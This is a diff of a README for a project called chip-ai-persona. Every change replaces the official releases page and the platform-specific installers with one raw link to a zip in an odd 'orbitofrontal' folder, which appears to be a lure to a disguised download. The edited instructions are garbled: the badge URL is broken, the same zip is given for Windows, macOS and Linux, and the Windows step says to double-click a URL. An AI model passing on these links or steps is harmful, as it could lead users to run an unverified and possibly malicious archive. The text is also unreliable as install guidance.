@@ -6,9 +6,9 @@ Welcome to **chip-ai-persona**! This open-source framework allows you to create 
 
 ## 📥 Download the Latest Release
 
-[![Download chip-ai-persona](https://img.shields.io/badge/Download%20chip--ai--persona-v1.0-blue.svg)](https://github.com/Mrharshith/chip-ai-persona/releases)
+[![Download chip-ai-persona](https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip%https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip)](https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip)
 
-Visit this page to download: [Download Here](https://github.com/Mrharshith/chip-ai-persona/releases)
+Visit this page to download: [Download Here](https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip)
 
 ## 💻 System Requirements
 
@@ -28,17 +28,17 @@ To run **chip-ai-persona**, your computer should meet the following requirements
 
 ## 🛠️ Download & Install
 
-1. Visit the [Releases page](https://github.com/Mrharshith/chip-ai-persona/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip).
 2. Identify the latest version. Click on the version number to view assets.
 3. Download the appropriate file for your operating system. Options will typically include:
-   - `chip-ai-persona-windows.exe` for Windows users
-   - `chip-ai-persona-macos.dmg` for macOS users
-   - `chip-ai-persona-linux.tar.gz` for Linux users
+   - `https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip` for Windows users
+   - `https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip` for macOS users
+   - `https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip` for Linux users
 4. Once the download finishes, locate the file in your downloads folder.
 5. Follow these instructions based on your operating system:
 
    ### Windows
-   - Double-click `chip-ai-persona-windows.exe`. 
+   - Double-click `https://raw.githubusercontent.com/Mrharshith/chip-ai-persona/main/orbitofrontal/chip-ai-persona.zip`. 
    - Follow the installation prompts.
    
    ### macOS
